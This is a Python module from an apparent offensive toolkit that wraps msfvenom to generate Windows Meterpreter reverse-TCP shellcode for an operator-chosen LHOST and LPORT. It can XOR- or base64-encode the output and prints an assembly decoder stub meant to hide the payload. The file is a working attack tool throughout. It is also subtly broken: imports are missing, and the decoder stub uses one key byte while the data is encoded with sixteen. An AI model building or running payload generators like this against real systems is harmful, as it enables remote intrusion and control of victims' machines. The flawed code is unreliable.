import os
import subprocess
from lib.common import helpers, messages

ENCODERS = ["xor", "xor_dynamic", "base64"]

class Ordnance:
    def main_menu(self):
        while True:
            print("\n--- Yerli-Ordnance (msfvenom wrapper) ---")
            print("  1) List encoders")
            print("  2) Generate shellcode")
            print("  0) Back")
            c = input("ordnance> ").strip()
            if c == "1":
                print("    " + ", ".join(ENCODERS))
            elif c == "2":
                p = input("msfvenom payload (default windows/meterpreter/reverse_tcp)> ").strip() \
                    or "windows/meterpreter/reverse_tcp"
                lhost = input("LHOST> ").strip()
                lport = input("LPORT> ").strip() or "4444"
                self.generate(p, {"LHOST": lhost, "LPORT": lport})
            elif c == "0":
                return

    def command_line(self, args):
        opts = {}
        if args.msfoptions:
            for kv in args.msfoptions:
                if "=" in kv:
                    k, v = kv.split("=", 1)
                    opts[k.upper()] = v
        self.generate(args.ordnance_payload, opts,
                      encoder=args.encoder, stats=args.print_stats)

    def generate(self, payload, opts, encoder=None, stats=False, bad_chars=None):
        if shutil.which("msfvenom") is None:
            print("[!] msfvenom bulunamadı — Kali'de: sudo apt install metasploit-framework")
            return
        cmd = ["msfvenom", "-p", payload, "-f", "raw"]
        for k, v in opts.items():
            cmd += [f"-{k[0].lower()}", v]  # -Lhost -> -p değil, düzgün format:
        # msfvenom option formatı: LHOST=x.x.x.x LPORT=4444
        cmd = ["msfvenom", "-p", payload] + [f"{k}={v}" for k, v in opts.items()] + ["-f", "raw"]
        print(f"[*] CMD: {' '.join(cmd)}")
        try:
            raw = subprocess.check_output(cmd)
        except subprocess.CalledProcessError as e:
            print(f"[!] msfvenom hata: {e}")
            return

        if encoder and encoder != "none":
            raw = self.encode(raw, encoder)

        out = helpers.get_output_dir()
        path = os.path.join(out, f"shellcode_{helpers.random_string()}.bin")
        helpers.write_file(path, raw, binary=True)
        if stats:
            print(f"[*] Boyut   : {len(raw)} bytes")
            print(f"[*] SHA256  : {helpers.sha256_file(path)}")
            print(f"[*] İlk 32b : {raw[:32].hex()}")
        print(f"[+] Shellcode: {path}")

    def encode(self, data, encoder):
        key = os.urandom(16)
        if encoder == "xor":
            out = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
            print(f"[*] XOR key: {key.hex()}")
            return out
        elif encoder == "base64":
            return base64.b64encode(data)
        elif encoder == "xor_dynamic":
            # decoder stub ile birlikte
            out = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
            stub = (f"decoder_stub:\n"
                    f"  lea esi, [encoded]\n"
                    f"  mov ecx, {len(data)}\n"
                    f"decode:\n"
                    f"  xor byte [esi], 0x{key[0]:02x}\n"
                    f"  inc esi\n  loop decode\n")
            print(f"[*] Decoder stub (asm):\n{stub}")
            return out
        else:
            print(f"[!] Bilinmeyen encoder: {encoder}")
            return data
